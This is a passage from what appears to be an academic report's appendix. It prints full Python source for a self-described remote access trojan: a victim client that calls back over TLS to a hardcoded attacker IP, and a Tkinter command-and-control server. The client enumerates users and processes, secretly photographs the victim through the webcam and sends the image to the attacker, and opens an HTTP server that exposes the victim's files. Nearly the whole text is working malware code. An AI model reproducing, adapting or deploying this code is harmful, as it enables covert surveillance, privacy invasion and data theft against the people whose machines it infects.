\pagenumbering{Roman}

# Appendix 1: Python code 

Below is the python code that was compiled to create a working custom payload. The code below was adapted from a previous piece of work to create the RAT virus. The two files required to compile for the victim is client.py and clientENUM.py, all other files are for server/attacker side purposes. 

## checkFILES.py
```python
import os

class checkFILES:

    @staticmethod
    def check_RecvData():
        #static method as this is a gerneral purpose function
        path = os.path.dirname(os.path.realpath(__file__))
        #finding the current directory that we are in (this is not the working directory)
        if not os.path.exists(f'{path}/RecvData'):
            #if the current directory does not contain /RecvData then this is TRUE
            os.mkdir(f'{path}/RecvData')
            #it will now create the new direcotry if the previous line returned TRUE
        else:
            print('We have got that directory!')
        return True
            #Else we will notify the user taht we have the directory already

    '''
    check_RecvData - purpose of this method is to check whether the needed directories to run the program exist. if not this will create it.
    Args:
        - Takes no arguments
    Returns:
        - Not a function (needs no return)
    Requirements:
        - Needs OS import
    '''

    @staticmethod
    def check_data():
        #static method as this is a gerneral purpose function
        path = os.path.dirname(os.path.realpath(__file__))
        #finding the current directory that we are in (this is not the working directory)
        if not os.path.exists(f'{path}/data'):
            #if the current directory does not contain /RecvData then this is TRUE
            os.mkdir(f'{path}/data')
            #it will now create the new direcotry if the previous line returned TRUE
        else:
            print('We have got that directory!')
            #Else we will notify the user taht we have the directory already
        return True


    '''
    check_data - purpose of this method is to check whether the needed directories to run the program exist. if not this will create it.
    Args:
        - Takes no arguments
    Returns:
        - Not a function (needs no return)
    Requirements:
        - Needs OS import
    '''
```

## client.py
```python
import socket
import ssl
import os
import ClientENUM


HEADER = 128
PORT = 443
SERVER = '192.168.0.160'


def main(SERVER):
    config = input(f'Do you want to connect to current server ({SERVER}) (y/n): ')
    #giving the user an option to change the server they are connecting to (default is already set)
    if config == 'y':
        #if True then it will connect to default
        ADDRESS = (SERVER,PORT)
        run_client(SERVER,ADDRESS)
    else:
        SERVER1 = input('Please enter the IP address you want to connect to: ')
        #else it will let the user input their own IP
        ADDRESS = (SERVER1,PORT)
        run_client(SERVER1,ADDRESS)

    '''
    main() - purpose of this function is to allow the user to change the IP they are connecting to if its different from mine (99% chance will be different from mine)
    Args:
        SERVER: this is the current IP that the socket will connect to if not changed
    Returns: 
        - Nothing
    '''


def run_client(SERVER, ADDRESS):
    try:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        ssl_socket = ssl_context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
        ssl_socket.connect(ADDRESS)
        #client.connect(ADDRESS)
        #connecting to the server
        client_Handler(ssl_socket)
        #client_Handler(client)
    except socket.error as e:
        #if any erros there was probably an error with the inputted IP
        print(f'{e}\nPlease Try Again')
        main(SERVER)

    '''
    run_Client() - purpose of this function is to establish the connection between the server and the client
    Args:
        SERVER: this is the IP address of the server that the client is trying to connect to
        ADDRESS: this is the IP address and the port of the server that the client is trying to connect to.
    Returns:
        - Nothing
    '''


def client_Handler(client):
    print(f'[SERVER] Connected to server')
    #confirmation that the Client has connected to the server
    connected = True
    #our bool connected is now true
    while connected:
        #while we are connected this is true
        msg_length = int(client.recv(HEADER).decode('utf-8'))
        #recieving the header
        if msg_length:
            #if there is a message
            msg = client.recv(msg_length).decode('utf-8')
            #we will decode the message
            print(f'[SERVER] Sent: {msg}')
            #printing the recieved command

            if msg == 'send_File':
                ClientENUM.ClientENUM.browse_download(client)


            elif msg == 'get_Users':
                users = ClientENUM.ClientENUM.get_Users()
                client.send(f'[CLIENT] {socket.gethostbyname(socket.gethostname())}: This machines users are: {users}'.encode('utf-8'))

            elif msg == 'take_pic':
                image = ClientENUM.ClientENUM.capture_webcam()
                if image:
                    ClientENUM.ClientENUM.send_File(client, image)
                    os.remove(image)
                else:
                    client.send("No camera detected")

            elif msg == 'get_Processes':
                processes = ClientENUM.ClientENUM.get_Processes()
                client.send(f'[CLIENT] {socket.gethostbyname(socket.gethostname())}: This machines first 10 running processes are: {processes}'.encode('utf-8'))

            elif msg == ':Disconnect:':
                print(f'[SERVER] Has disconnected you')
                #if disconnect it will disconnect the user
                connected = False
                #setting connected to false to escape the infinite loop
            else:
                client.send(f'{msg}'.encode('utf-8'))
                #if somehow the Server sends an unrecognised command it will send this to the server

    client.close()
    #closing the connection when out of the while loop

    '''
    client_Handler() - purpose of this function is to handle the messages sent between the server and the client. This function will also retrieve requested data from the clients machine
    Args:
        Client - this is the connection between the server and the client
    Returns:
        - Nothing 
    '''


if __name__ == '__main__':
    main(SERVER)
```
## ClientENUM.py
```python
import threading
import socket
import psutil
import os
from datetime import datetime
import cv2
import subprocess
import time
from PIL import ImageGrab

class ClientENUM:



    @staticmethod
    def get_Memory():
        #function that will return total memory of the computer that is running the command
        return ((psutil.virtual_memory().total)/1024/1024/1024)
        #returning the total memory of the computer /1024 * 3  as we want the results in GB

    '''
    get_Memory() - Purpose of this function is calculate the total memory of the client
    Args:
        - None
    Returns: 
        - returns the total memory of the client
    Requirements:
        - Needs the psutil import
    '''

    @staticmethod
    def get_Users():
        #function that will return how many users there are on the computer
        users = []
        #creating a list so that we can append each user to the list
        users_all = psutil.users()
        #grabbing the users from the psutil library
        for user in users_all:
            #checking through all the users
            users.append(user.name)
            #appending each one to our list
        return users
        #returning the output back to client.py

    '''
    get_Users() - Purpose of this function is to get the total users of the computer
    Args:
        - None
    Returns:
        - Returns the total number of users on the local machine
    Requirements:
        - Needs the psutil import
    '''

    @staticmethod
    def get_Processes():
        #function that will return the current running processes on a machine
        processes = []
        #again creating a list so that we can append each process to the lsit
        i = 0
        #creating a counter so that we dont print all of them (there is a lot)
        processes_all = psutil.process_iter()
        #grabbing all the processes into processes_all (you could print this if you wanted)
        for process in processes_all:
            #iterating through the processes
            if i < 10:
                #if i is less than 10 then this is TRUE
                processes.append(process.name())
                #if the previous above is TRUE then we will append the process
                i+=1
                #adding 1 to our counter
        return processes
        #after the if statement returns false we will return our list of processes

    '''
    get_Processes() - Purpose of this function is to get the first 10 running processes on a clients machine
    Args:
        - None
    Returns: 
        - Returns the first 10 running processes on the local machine
    Requirements:
        - Needs the psutil import
    '''

    @staticmethod
    def send_File(client, file_path):
        file_name = os.path.basename(file_path)
        print(file_name)
        client.send(file_name.encode('utf-8'))

        file_size = os.path.getsize(file_path)
        client.send(str(file_size).encode('utf-8'))

        with open(file_path, 'rb') as f:
            while True:
                left_to_send = f.read(1024)
                if not left_to_send:
                    break
                client.sendall(left_to_send)


    '''
    send_File() - Purpose of this function is to send all the files that exist in the data directory.
    Args:
        Client: This is the connection to the server and is how we will send the files over the network
    Returns:
        - None
    Requirements:
        - Needs the OS import
        - Needs the time import (this stops the client from crashing)
    '''

    @staticmethod
    def capture_webcam():
        webcam = cv2.VideoCapture(0)
        results, image = webcam.read()
        time = datetime.now()
        formatted_t = time.strftime("%H_%M_%S")

        if results:
            filename = f"WEBCAM_PIC_{formatted_t}.png"
            cv2.imwrite(filename, image)
            #print("Image saved")
        else:
            #print("No camera detected.")
            filename = False
        webcam.release()
        cv2.destroyAllWindows()
        return filename

    @staticmethod
    def browse_download(client):

        def start_http():
            start_python_server = subprocess.Popen(['python', '-m', 'http.server', '8000'])
            time.sleep(45)
            start_python_server.terminate()

        thread = threading.Thread(target=start_http)
        thread.start()
        client.send(f'HTTP Server Open for 45 seconds at {socket.gethostbyname(socket.gethostname())}:8000'.encode('utf-8'))

```

## GUI.py
```python
import tkinter
from tkinter import *
import server


class GUI:
    @staticmethod
    def client_Handler(connection, ip_split, frame, connections):
        client = Label(frame, text=f'[CLIENT] {ip_split}')
        client.grid(row=len(connections), column=0,padx=10, pady=7)

        btn_get_File = Button(frame, text='Command: Browse/Download', bg = '#4DAF50', fg='white',width=25, command=lambda:  server.server.send_Msg(connection, 'send_File' , connections, isfile=False))
        btn_get_File.grid(row=len(connections), column=1,padx=2, pady=2)

        btn_get_users = Button(frame, text='Command: Get Users', bg = '#4DAF50', fg='white',width=25, command=lambda:  server.server.send_Msg(connection, 'get_Users', connections, isfile=False))
        btn_get_users.grid(row=len(connections), column=2,padx=2, pady=2)

        btn_get_ports = Button(frame, text='Command: Get Processes', bg = '#4DAF50', fg='white',width=25, command=lambda:  server.server.send_Msg(connection, 'get_Processes',  connections,isfile=False))
        btn_get_ports.grid(row=len(connections), column=3,padx=2, pady=2)

        btn_get_cam = Button(frame, text='Command: Take cam picture', bg = '#4DAF50', fg='white',width=25, command=lambda:  server.server.send_Msg(connection, 'take_pic', connections, isfile=True))
        btn_get_cam.grid(row=len(connections), column=4,padx=2, pady=2)

        btn_disconnect = Button(frame, text='Command: Disconnect', bg = '#FF5750', fg='white',width=25, command=lambda:  server.server.disconnecting(connection, ip_split, frame, connections))
        btn_disconnect.grid(row=len(connections), column=5,padx=2, pady=2)


        '''
        client_Handler() - Purpose is to give the user a clear and undertandable GUI to be able to send recognised commands to the cleint(s) via buttons
        Args:
            connection: this is the current connection that the server will send the commands to
            ip_split: this is the IP of the client (will display in a label so the server user can identify different users and who is connected)
            frame: this is the frame that the buttons and labels of different users are placed on
            connections: this is the dictionary that holds the information about the connected users.
        Returns: 
            - Has no returns
        Requirements:
            - Needs the tkinter import
        '''



    @staticmethod
    def send_File(connections, checkbox_dict,command):
        for conn_socket, checkbox_var in checkbox_dict.items():
            if checkbox_var.get() == 1:
                server.server.send_Msg(conn_socket, command, connections, isfile=True)

    '''
    send_File():
    Args:
        connections: this is the dictionary of current connections we have
        checkbox_dict: this is the dictionary of current users checkboxes
        command: this is the command we want to send to client(s)
    Returns:
        - Nothing
    '''


    @staticmethod
    def send_enum(connections, checkbox_dict, command):
        isfile = False
        for conn_socket, checkbox_var in checkbox_dict.items():
            if checkbox_var.get() == 1:
                server.server.send_Msg(conn_socket, command, connections, isfile)

    '''
    send_enum():
    Args:
        connections: dictionary of current connections
        checkbox_dict: this is the dictionary of current users checkboxes
        command: this is the command we want to send to client(s)
    Returns:
        - Absolutely nothing
    '''

    @staticmethod
    def multi_Client(connections, address):
        multi = Toplevel()
        multi.geometry('500x300')
        multi.title('Multi Client Handler')
        z = 50
        Lab1 = Label(multi, text='Please select the users you want to send a command to')
        Lab1.pack()

        # Create dictionary to store checkbox values with socket connections as keys
        checkbox_dict = {}
        for conn_socket in connections.values():
            checkbox_dict[conn_socket] = IntVar()

        for i, (conn_address, conn_socket) in enumerate(connections.items()):
            x = tkinter.Checkbutton(multi, text=f'Client {conn_address}', onvalue=1, offvalue=0, pady=15, variable=checkbox_dict[conn_socket])
            x.place(x=250, y=z)
            x.pack()

        # Create SEND button and attach send_message function as the callback
        btn_send = Button(multi, text='Command: Browse/Download', command=lambda: GUI.send_enum(connections, checkbox_dict, command='send_File'))
        btn_send.place(x=250, y=z + 40)
        btn_send.pack()

        btn_get_users = Button(multi, text='Command: Get Users', command=lambda: GUI.send_enum(connections, checkbox_dict, command='get_Users'))
        btn_get_users.place(x=250, y=z + 40)
        btn_get_users.pack()

        btn_get_proc = Button(multi, text='Command: Get Processes', command=lambda: GUI.send_enum(connections, checkbox_dict, command='get_Processes'))
        btn_get_proc.place(x=250, y=z + 40)
        btn_get_proc.pack()

        btn_get_cam = Button(multi, text='Command: Take cam picture', command=lambda: GUI.send_File(connections, checkbox_dict, command='take_pic'))
        btn_get_cam.place(x=250, y=z + 40)
        btn_get_cam.pack()
        multi.mainloop()

        '''
        multi_Client():
        Args:
            connections: the dictionary of connections that we are currently connected to
            address: This is the address of the client
        Returns:
            - Has no returns (is a GUI)
        '''

```

## Server.py
```python
import os
import threading
import socket
from tkinter import *
import GUI
import checkFILES
import ssl

class server:
    def __init__(self):
        self.HEADER = 128

        #checkFILES.checkFILES.check_data()

        #checkFILES.checkFILES.check_RecvData()

        PORT = 443
        SERVER = socket.gethostbyname(socket.gethostname())
        print(SERVER)
        #SERVER = '192.168.0.26'
        #this is getting the hosts IP address
        self.ADDRESS = (SERVER, PORT)
        #what IP and port we are listening on
        path = os.path.dirname(os.path.realpath(__file__))
        #finding the path of the directory we are getting the certificate and key
        self.server = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), certfile=f'{path}/Cert/server.crt', keyfile=f'{path}/Cert/server.key', server_side=True)
        #setting the server socket to be a stream of data
        self.server.bind(self.ADDRESS)
        #binding the address to the socket


        self.connections = {}
        self.address = ''
        #creating a dictionary for the connections we will recieve
        self.root = Tk()
        #creating a GUI
        self.switch = False
        #this is a button which tells us if we are sending to all clients at once or not (right now its false)
        self.sendmulti = Button(self.root, text="Send Mutliple", bg = 'blue', fg='white', command= lambda: GUI.GUI.multi_Client(self.connections,self.address))
        self.sendmulti.pack(side='top')
        #this is the sendall button which will be situated at the top of the screen
        self.root.geometry('1300x300')
        #setting the size of the screen
        self.root.title('Main Controller')
        #setting the name of the screen
        self.main_Frame = Frame(self.root)
        self.main_Frame.pack()

        #turning the page into a Frame so we can place widigits/Frames on top

        '''
        __init__() - Purpose of this method is to initialize all of the required variables that will be called upon by other functions
        Args:
            Self: will allow other functions to call upon any variable within the initialization (is an instance of an object)
        Returns:
            - Nothing
        '''

    def start(self):
        thread1 = threading.Thread(target=self.incoming_Con_Listener)
        #starting a thread to listen for incoming connections
        thread1.start()
        self.root.mainloop()
        #starting the thread and the loop

        '''
        start() - Purpose of this is to start the server and create a thread for the incoming connections
        Args:
            Self: will allow other functions to call upon any variable that is needed within the program (is an instance of an object)
        Returns:
            - Nothing (not a functon)
        '''


    def send_Msg(self,connection, msg, connections, isfile):
        HEADER =128
        #function to send a message to a connection
        message = msg.encode('utf-8')
        #we need to encode the message using utf-8
        msg_length = len(message)
        #figuring out the length of the message so that we can send with a header
        send_length = str(msg_length).encode('utf-8')
        #We now also need to encode the length of the message so that we can send with a header
        send_length += b' ' * (HEADER - len(send_length))
        #Calculating the byte length of the message we want to send
        if msg != ':Disconnect:':
            #this is so you cant disconnect all the users at once (it causes a crash due to connections{} being manipulated by clients)
            connection.send(send_length)
            #sending the header first to the user so that they can know when to stop receiving messages
            connection.send(message)
            #sending our actual contnet message
            server.is_File(connection, isfile)
            #going to server so we can check whether the recieved message is a file
        else:
            connection.send(send_length)
            #sending the length of the message
            connection.send(message)
            #sending the actual content of the message

    '''
    send_Msg() - Purpose of this function is to send to the client
    Args:
        Self: will allow other functions to call upon any variable that is needed within the program (is an instance of an object)
        connection: this is the current machine that the server will be sending commands to.
        msg: This is the command/message the server wants to send to the client(s)
        connections: if the sendall button is enabled. this will allow the server to send a message/command to all clients at once.
        isFile: when recieving a message back from the client, if we are expecting a file this will be true 
    Returns:
        - Needs no returns 
    '''
    @staticmethod
    def is_File(connection, isfile):
        if isfile:
            file_name = connection.recv(5096).decode('utf-8')
            path = os.path.dirname(os.path.realpath(__file__))
            file_size = int(connection.recv(1024).decode())
            print(f"File size: {file_size} bytes")
            received_bytes = 0
            with open(path + '/RecvData/' + file_name, 'wb') as file:
                while received_bytes < file_size:
                    to_recv = connection.recv(1024)
                    if not to_recv:
                        break
                    file.write(to_recv)
                    received_bytes += len(to_recv)
            print(f"File '{file_name}' received and saved to {path}\RecvData/{file_name}")
        else:
            print(connection.recv(5096).decode('utf-8'))

    '''
    is_File() - Purpose of this function is to recieve feedback back from the client and check whether the feedback is in file format
    Args:
        Self: will allow other functions to call upon any variable that is needed within the program (is an instance of an object)
        connection: this is the current machine that the server will be recieving feedback from
        isFile: a boolean variable telling us is the user is sending us a file or not.
    Returns:
        - Has no returns
    '''



    def disconnecting(self,connection, ip_split, frame, connections):
        print(f'[SERVER] [CLIENT] {ip_split} has disconnected')
        isfile = False
        #confirmation that the user have been disconnected
        del self.connections[ip_split]
        #deleting the connection out of the dictionary
        server.send_Msg(connection, ':Disconnect:', connections, isfile)
        #sending our command which the user looks out for to perform the disconnection
        connection.close()
        #closing that connection our end
        frame.destroy()
        #destroying the frame in the GUI

    '''
    disconnecting() - Purpose of this function is to disconnect the client from the server
    Args:
        Self: will allow other functions to call upon any variable that is needed within the program (is an instance of an object)
        connection: connection: this is the current machine that the server will be sending the disconnect command to.
        ip_split: this is a variable which holds the IP of the connected machine (this is a visual variable to show the client has been disconnected)
        frame: this is the GUI frame that holds the clients buttons and labels
        connections: this is the dictionary that holds all the connected clients info 
    Returns: 
        - Reutrns nothing
    '''

    def incoming_Con_Listener(self):
        self.server.listen()
        #starting listening on our address and port
        print('[SERVER] Started up successfully!')
        #confirmation message that the server started
        while True:
            #infinate loop to alwasy accept connections
            connection, self.address = self.server.accept()
            #creating our connection
            ip_split = f'{self.address[0]}:{self.address[1]}'
            #getting the IP address of the new connection
            self.connections[ip_split] = connection
            #adding the ip to the connections dictionary
            print(f'[SERVER] [CLIENT] {ip_split} has connected')
            #letting the user know that a user has connected!
            frame = Frame(self.root)
            #creating a new frame
            frame.pack(side=TOP,anchor=NW,padx=10,pady=10)
            #packing it to the top left of the frame
            thread2 = threading.Thread(target=GUI.GUI.client_Handler, args=(connection, ip_split, frame, self.connections))
            #creating a new thread so each client can have their own buttons/commands on the GUI
            thread2.start()
            #starting the thread

    '''
    incoming_Con_Listener() - Purpose is to listen for incoming connections from the clients. it will constantly be listening out for new connections
    Args:
        Self: will allow other functions to call upon any variable that is needed within the program (is an instance of an object)
    Returns:
        - Needs no returns
    '''

server = server()
server.start()
```
